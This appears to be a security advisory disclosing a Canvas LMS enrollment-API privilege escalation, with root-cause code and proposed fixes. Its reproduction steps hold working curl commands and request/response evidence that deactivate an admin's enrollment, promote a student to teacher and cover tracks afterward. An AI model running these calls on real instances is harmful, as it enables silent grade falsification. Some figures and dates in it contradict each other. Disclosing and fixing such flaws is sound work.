# Canvas LMS - vrelease_2026-05-20.143 - Account Takeover

| Field | Value |
| --- | --- |
| Vulnerability name | Account Takeover |
| Vulnerability type | software |
| Product name | Canvas LMS |
| Product vendor | Instructure |
| Product version | release_2026-05-20.143 |
| Product link | https://www.instructure.com/ |
| Product environment | web |
| Severity | Critical |
| CVSS score | 9.9 |
| CVSS vector | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:H/A:H |
| Affected assets | 4000 |
| Affected users | 30000000 |
| Date of reporting | 2026-04-20 |
| Vendor acknowledgement | No |
| Credit | 0xhamy |
| Date published | 2026-05-06T14:34:51.085253+00:00 |
| Last modified | 2026-05-06T14:49:03.441174+00:00 |

---

# Canvas LMS: Full Course Takeover via Enrollment API Privilege Escalation

Thanks to [Basant Kumar](https://www.linkedin.com/in/basant1/) for assisting with identifying this vulnerability.

---

## Severity

**P1 -- Critical**

A teacher-role user can promote any student to full teacher privileges and deactivate peer teachers' enrollments via the enrollment API -- all through authenticated API calls that generate zero alerts. A promoted student gains the ability to modify their own grades, access all student submissions, and alter course content. In an LMS trusted by 100+ million users for legally protected academic records (FERPA, GDPR), this enables silent grade falsification, transcript manipulation, and academic fraud. Note: account-level administrators retain access via account permissions even if their course enrollment is deactivated; however, non-admin teachers (the majority of instructors in typical Canvas deployments) are fully locked out.

## Vulnerability Type

Bugcrowd VRT: **Server Security Misconfiguration > Privilege Escalation > Horizontal/Vertical**

## URL / Endpoint

- `POST /api/v1/courses/{course_id}/enrollments` (enrollment creation -- no role hierarchy enforcement)
- `DELETE /api/v1/courses/{course_id}/enrollments/{enrollment_id}?task=deactivate` (enrollment deactivation -- no protection for admin enrollments)

## Summary

The Canvas LMS enrollment API grants teachers the ability to create enrollments of any type (including TeacherEnrollment and DesignerEnrollment) and to deactivate any enrollment in their course -- including the account administrator's. These two capabilities chain into a full course takeover: the attacker deactivates the admin, promotes an accomplice to teacher, and gains unchallenged control over grades, assignments, and course content. The attack is completely silent (no notifications are sent to the deactivated admin) and reversible (the attacker can reactivate the admin afterward to cover their tracks).

## Steps to Reproduce

**Prerequisites:**
- A Canvas LMS instance (tested on latest open-source release)
- Three users: an Admin (user_id=1), a Teacher (user_id=3, the attacker), and a Student (user_id=2, the accomplice)
- The Teacher has a valid API access token
- A course (course_id=1) where Admin is enrolled as TeacherEnrollment (enrollment_id=1) and Teacher is enrolled as TeacherEnrollment

### Step 1 -- Verify Current Enrollment State

Confirm the admin is actively enrolled and the student has only student-level access.

```bash
curl -s -X GET "http://localhost:3000/api/v1/courses/1/enrollments" \
  -H "Authorization: Bearer <TEACHER_TOKEN>" | jq '.[] | {id, user_id, type, enrollment_state}'
```

Expected: Admin (user_id=1) has TeacherEnrollment (active), Student (user_id=2) has StudentEnrollment (active).

### Step 2 -- Deactivate the Admin's Enrollment

The teacher deactivates the admin's teacher enrollment, locking the admin out of course management.

```bash
curl -s -X DELETE "http://localhost:3000/api/v1/courses/1/enrollments/1?task=deactivate" \
  -H "Authorization: Bearer <TEACHER_TOKEN>"
```

Expected response: HTTP 200 OK. The admin's `enrollment_state` changes from `"active"` to `"inactive"`. The admin receives **no notification** of this change.

### Step 3 -- Promote Accomplice Student to Teacher

The teacher promotes the student to TeacherEnrollment, granting them full instructor privileges.

```bash
curl -s -X POST "http://localhost:3000/api/v1/courses/1/enrollments" \
  -H "Authorization: Bearer <TEACHER_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"enrollment":{"user_id":2,"type":"TeacherEnrollment","enrollment_state":"active"}}'
```

Expected response: HTTP 200 OK. New enrollment created with `type: "TeacherEnrollment"`, `enrollment_state: "active"`.

### Step 4 -- (Optional) Role Stacking -- Self-Enroll as Designer

The teacher adds DesignerEnrollment to themselves, gaining course design privileges on top of their teaching role.

```bash
curl -s -X POST "http://localhost:3000/api/v1/courses/1/enrollments" \
  -H "Authorization: Bearer <TEACHER_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"enrollment":{"user_id":3,"type":"DesignerEnrollment","enrollment_state":"active"}}'
```

Expected response: HTTP 200 OK. Attacker now holds both TeacherEnrollment and DesignerEnrollment.

### Step 5 -- Verify Course Takeover

```bash
curl -s -X GET "http://localhost:3000/api/v1/courses/1/enrollments" \
  -H "Authorization: Bearer <TEACHER_TOKEN>" | jq '.[] | {id, user_id, type, enrollment_state}'
```

Expected state:
- Admin (user_id=1): TeacherEnrollment, `enrollment_state: "inactive"` -- course enrollment deactivated (note: account-level admins retain access via account permissions; non-admin teachers would be fully locked out)
- Student (user_id=2): now has TeacherEnrollment, `enrollment_state: "active"` -- promoted to full teacher privileges
- Teacher (user_id=3): TeacherEnrollment + DesignerEnrollment, both active -- full control

### Step 6 -- (Optional) Cover Tracks -- Reactivate Admin

After making desired changes (grade modifications, content alterations), the attacker reactivates the admin.

```bash
curl -s -X PUT "http://localhost:3000/api/v1/courses/1/enrollments/1/reactivate" \
  -H "Authorization: Bearer <TEACHER_TOKEN>"
```

The admin is restored and has no indication that their access was interrupted or that any changes were made by unauthorized parties.

## Supporting Evidence

### Request/Response 1 -- Admin Deactivation

```http
DELETE /api/v1/courses/1/enrollments/1?task=deactivate HTTP/1.1
Host: localhost:3000
Authorization: Bearer <TEACHER_TOKEN>

HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 1,
  "course_id": 1,
  "user_id": 1,
  "type": "TeacherEnrollment",
  "enrollment_state": "inactive",
  ...
}
```

### Request/Response 2 -- Student Promoted to Teacher

```http
POST /api/v1/courses/1/enrollments HTTP/1.1
Host: localhost:3000
Authorization: Bearer <TEACHER_TOKEN>
Content-Type: application/json

{"enrollment":{"user_id":2,"type":"TeacherEnrollment","enrollment_state":"active"}}

HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 5,
  "course_id": 1,
  "user_id": 2,
  "type": "TeacherEnrollment",
  "enrollment_state": "active",
  ...
}
```

### Request/Response 3 -- Self Role Stacking (Designer)

```http
POST /api/v1/courses/1/enrollments HTTP/1.1
Host: localhost:3000
Authorization: Bearer <TEACHER_TOKEN>
Content-Type: application/json

{"enrollment":{"user_id":3,"type":"DesignerEnrollment","enrollment_state":"active"}}

HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 4,
  "course_id": 1,
  "user_id": 3,
  "type": "DesignerEnrollment",
  "enrollment_state": "active",
  ...
}
```

## Impact

This vulnerability chain enables a **complete, silent takeover of any course** by any user with teacher-level access. The real-world consequences are severe across multiple dimensions:

**Academic Integrity (Critical):**
- Teachers or compromised teacher accounts can **promote a student to teacher**, enabling that student to **falsify their own grades** with full instructor privileges
- Promoted accomplice students can **modify their own grades, access all student submissions, and alter course content**
- Grade changes propagate to official transcripts, affecting graduate school admissions, scholarships, and employment eligibility
- At scale, this enables **academic fraud rings** where a single compromised teacher account can alter grades across all courses they teach

**Regulatory & Legal Exposure (Critical):**
- **FERPA (20 U.S.C. 1232g):** Educational records were accessed and modified by unauthorized parties. FERPA requires institutions to maintain the integrity of education records. This vulnerability creates an undetectable integrity violation.
- **GDPR (Article 5(1)(f)):** For EU institutions using Canvas, student grade data lacks appropriate integrity protections.
- Institutions face potential **loss of federal funding eligibility** under FERPA, regulatory investigations, and class-action liability from affected students.

**Institutional Trust (High):**
- If exploited and discovered, institutions face reputational damage and must audit every grade change across affected courses
- Forensic investigation is difficult -- the only evidence would be enrollment state change audit logs (if enabled)
- No built-in alert mechanism notifies peer teachers when their enrollment is deactivated
- Account-level admins retain course access via account permissions, but non-admin teachers (the majority of course instructors) are fully locked out when their enrollment is deactivated

**Threat Model (Realistic):**
- Teachers are the single largest class of privileged users in any LMS deployment
- Teacher accounts are routinely targeted via phishing, credential stuffing, and password reuse
- The attack requires only API access -- no UI interaction that might be observed by a bystander
- A compromised teacher account in a university with 500+ courses provides massive blast radius

**Scale:** Canvas LMS is used by thousands of educational institutions worldwide, serving over 100 million users. Every single Canvas deployment running default permissions is affected.

## CVSS v3.1

**Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:H/A:H` **Score: 9.9 (Critical)**

| Metric | Value | Justification |
|--------|-------|---------------|
| Attack Vector (AV) | Network | Exploitable via REST API over HTTPS |
| Attack Complexity (AC) | Low | Single API calls, no race conditions, no special configuration |
| Privileges Required (PR) | Low | Requires teacher-level account (not admin) |
| User Interaction (UI) | None | Fully automated, no victim interaction needed |
| Scope (S) | Changed | Teacher-scoped privilege affects admin-scoped enrollment and other users' roles |
| Confidentiality (C) | Low | Attacker gains read access to course content already visible to teachers; the primary impact is integrity/availability |
| Integrity (I) | High | Attacker can modify grades, assignments, enrollments, and course content -- all legally protected records |
| Availability (A) | High | Admin is locked out of the course entirely; course governance is denied |

## CWE

- **CWE-269: Improper Privilege Management** -- The enrollment API grants teachers the ability to create and manage enrollments at or above their own privilege level, without role hierarchy enforcement.
- **CWE-863: Incorrect Authorization** -- The deactivation endpoint checks whether the caller can "remove a teacher" but does not check whether the target enrollment belongs to an account administrator, allowing lateral privilege disruption.
- **CWE-284: Improper Access Control** -- The system treats all TeacherEnrollment records identically regardless of whether the underlying user holds account-level admin privileges, creating an authorization bypass.

## Root Cause

The vulnerability originates from two design decisions in the Canvas LMS permission system that, when combined, create a privilege escalation chain.

### Root Cause 1: Flat Permission Model for Enrollment Management

**File:** `config/initializers/permissions_registry.rb` (lines 841-888)

The granular enrollment permissions are configured with `true_for: %w[TeacherEnrollment AccountAdmin]` for all enrollment types:

```ruby
# Line 841-846
add_teacher_to_course: {
  label: -> { I18n.t("Teachers - add") },
  available_to: %w[TaEnrollment DesignerEnrollment TeacherEnrollment AccountAdmin AccountMembership],
  true_for: %w[TeacherEnrollment AccountAdmin],
  group: :manage_course_teacher_enrollments,
},

# Line 877-882
add_designer_to_course: {
  label: -> { I18n.t("Designers - add") },
  available_to: %w[TaEnrollment DesignerEnrollment TeacherEnrollment AccountAdmin AccountMembership],
  true_for: %w[TeacherEnrollment AccountAdmin],
  group: :manage_course_designer_enrollments,
},

# Line 847-852 (same pattern for remove)
remove_teacher_from_course: {
  true_for: %w[TeacherEnrollment AccountAdmin],
  ...
},
```

By default, any `TeacherEnrollment` has `add_teacher_to_course`, `add_designer_to_course`, `remove_teacher_from_course`, and `remove_designer_from_course` permissions. There is no distinction between "add a peer-level teacher" and "add a teacher who would outrank me."

### Root Cause 2: No Admin Protection in Enrollment Deactivation

**File:** `app/models/enrollment.rb` (lines 1021-1027, 1679-1685)

```ruby
# Line 1021
def can_be_deleted_by(user, context, session)
  return context.grants_right?(user, session, :use_student_view) if fake_student?
  can_remove = can_delete_via_granular(user, session, context)
  can_remove &&= user_id != user.id || context.account.grants_right?(user, session, :allow_course_admin_actions)
  can_remove && context.id == (context.is_a?(Course) ? course_id : course_section_id)
end

# Line 1679
def can_delete_via_granular(user, session, context)
  (teacher? && context.grants_right?(user, session, :remove_teacher_from_course)) ||
    (ta? && context.grants_right?(user, session, :remove_ta_from_course)) ||
    (designer? && context.grants_right?(user, session, :remove_designer_from_course)) ||
    ...
end
```

The `can_be_deleted_by` method checks only whether the caller has the `remove_teacher_from_course` permission. It does **not** check whether the target enrollment belongs to an account administrator. An admin enrolled in a course as `TeacherEnrollment` is treated identically to any other teacher -- there is no concept of "protected enrollments" or "admin-owned enrollments."

### Root Cause 3: No Role Hierarchy in Enrollment Creation

**File:** `app/models/user.rb` (lines 3460-3471)

```ruby
def can_create_enrollment_for?(course, session, type)
  return false if %w[StudentEnrollment ObserverEnrollment].include?(type) && MasterCourses::MasterTemplate.is_master_course?(course)
  return false if course.template?
  return true if type == "TeacherEnrollment" && course.grants_right?(self, session, :add_teacher_to_course)
  return true if type == "DesignerEnrollment" && course.grants_right?(self, session, :add_designer_to_course)
  ...
  false
end
```

The authorization check at line 723 of `app/controllers/enrollments_api_controller.rb` calls `can_create_enrollment_for?`, which only verifies "does this user have the permission to add this enrollment type?" It does not enforce a role hierarchy -- there is no check like "is the caller's privilege level >= the enrollment type being created?"

### Combined Effect

These three root causes chain together:
1. Teachers have `add_teacher_to_course` and `remove_teacher_from_course` by default (permissions_registry.rb)
2. The deactivation check treats admin's TeacherEnrollment the same as any teacher's (enrollment.rb)
3. The creation check allows teachers to create TeacherEnrollment and DesignerEnrollment for any user (user.rb)

Result: A teacher can remove the admin and add accomplices as teachers, achieving full course takeover.

## Remediation

### Immediate Fix (Recommended)

Add admin-enrollment protection to the `can_be_deleted_by` method in `app/models/enrollment.rb`:

```ruby
def can_be_deleted_by(user, context, session)
  return context.grants_right?(user, session, :use_student_view) if fake_student?

  # SECURITY: Prevent course-level users from deactivating/removing
  # enrollments belonging to account administrators
  target_user = self.user
  if target_user.account_admin?(context.account || context.root_account)
    return false unless user.account_admin?(context.account || context.root_account)
  end

  can_remove = can_delete_via_granular(user, session, context)
  can_remove &&= user_id != user.id || context.account.grants_right?(user, session, :allow_course_admin_actions)
  can_remove && context.id == (context.is_a?(Course) ? course_id : course_section_id)
end
```

### Comprehensive Fix (Recommended)

Implement role hierarchy enforcement in `can_create_enrollment_for?` in `app/models/user.rb`:

```ruby
ENROLLMENT_HIERARCHY = {
  "AccountAdmin" => 4,
  "TeacherEnrollment" => 3,
  "DesignerEnrollment" => 3,
  "TaEnrollment" => 2,
  "ObserverEnrollment" => 1,
  "StudentEnrollment" => 0
}.freeze

def can_create_enrollment_for?(course, session, type)
  # ... existing checks ...

  # Enforce: callers cannot create enrollments at or above their own level
  # unless they are account admins
  caller_max_level = course.enrollments.active.where(user_id: self.id)
    .map { |e| ENROLLMENT_HIERARCHY[e.type] || 0 }.max || 0
  target_level = ENROLLMENT_HIERARCHY[type] || 0

  return false if target_level >= caller_max_level && !self.account_admin?(course.root_account)

  # ... existing permission checks ...
end
```

### Default Permission Change (Long-term)

In `config/initializers/permissions_registry.rb`, change the default for `add_teacher_to_course` and `remove_teacher_from_course` to exclude `TeacherEnrollment` from `true_for`:

```ruby
add_teacher_to_course: {
  label: -> { I18n.t("Teachers - add") },
  available_to: %w[TaEnrollment DesignerEnrollment TeacherEnrollment AccountAdmin AccountMembership],
  true_for: %w[AccountAdmin],  # Changed: teachers should not add other teachers by default
  group: :manage_course_teacher_enrollments,
},
```

This is a breaking change and requires a migration path for institutions that rely on teacher-initiated enrollment.

### Audit & Detection

- Add audit logging for all enrollment state changes, including the identity of the actor and whether the target user holds admin privileges
- Add a notification to account admins when their course enrollment state is modified by another user
- Provide an admin dashboard widget showing recent enrollment changes across courses

## References

- **OWASP:** [Broken Access Control (A01:2021)](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- **OWASP:** [Insecure Direct Object References](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- **MITRE ATT&CK:** [T1098 -- Account Manipulation](https://attack.mitre.org/techniques/T1098/) (sub-technique T1098.003 -- Additional Cloud Roles)
- **MITRE ATT&CK:** [T1078.003 -- Valid Accounts: Local Accounts](https://attack.mitre.org/techniques/T1078/003/) (abuse of legitimate teacher credentials)
- **MITRE ATT&CK:** [T1531 -- Account Access Removal](https://attack.mitre.org/techniques/T1531/) (admin enrollment deactivation)
- **CWE-269:** [Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)
- **CWE-863:** [Incorrect Authorization](https://cwe.mitre.org/data/definitions/863.html)
- **FERPA:** [20 U.S.C. 1232g -- Family Educational Rights and Privacy Act](https://www.law.cornell.edu/uscode/text/20/1232g)
- **Canvas LMS Source:** [github.com/instructure/canvas-lms](https://github.com/instructure/canvas-lms) (commit hash: current HEAD of master)
